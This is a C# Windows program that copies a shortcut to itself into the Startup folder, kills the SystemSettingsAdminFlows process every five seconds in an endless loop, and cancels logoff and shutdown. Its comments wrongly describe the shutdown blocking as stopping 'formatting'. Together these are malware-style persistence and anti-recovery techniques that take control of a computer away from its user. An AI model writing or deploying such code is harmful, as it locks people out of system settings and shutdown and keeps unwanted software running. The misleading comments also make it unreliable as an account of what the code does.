using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32;

class Program
{
    static void Main(string[] args)
    {
        // Registering the event that prevents formatting
        SystemEvents.SessionEnding += SystemEvents_SessionEnding;

        // Create a shortcut in the Startup folder
        CreateShortcutInStartup();

        // Continuously search for and kill the SystemSettingsAdminFlows.exe process
        while (true)
        {
            Process[] processes = Process.GetProcessesByName("SystemSettingsAdminFlows");
            foreach (Process process in processes)
            {
                process.Kill();
                Console.WriteLine("SystemSettingsAdminFlows.exe process found and killed.");
            }

            System.Threading.Thread.Sleep(5000); // Add a delay to avoid excessive CPU usage
        }
    }

    static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
    {
        Console.WriteLine("Formatting attempt detected. Operation cancelled.");
        e.Cancel = true; // Cancel the operation
    }

    static bool IsAdministrator()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    static void CreateShortcutInStartup()
    {
        string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        string shortcutPath = Path.Combine(startupFolderPath, "ProgramShortcut.lnk");

        if (!File.Exists(shortcutPath))
        {
            object shell = Activator.CreateInstance(Type.GetTypeFromProgID("WScript.Shell"));
            var shortcut = shell.GetType().InvokeMember("CreateShortcut", System.Reflection.BindingFlags.InvokeMethod, null, shell, new object[] { shortcutPath });
            shortcut.GetType().InvokeMember("TargetPath", System.Reflection.BindingFlags.SetProperty, null, shortcut, new object[] { Process.GetCurrentProcess().MainModule.FileName });
            shortcut.GetType().InvokeMember("Save", System.Reflection.BindingFlags.InvokeMethod, null, shortcut, null);
            Console.WriteLine("Shortcut created in Startup folder.");
        }
        else
        {
            Console.WriteLine("Shortcut already exists in Startup folder.");
        }
    }
}
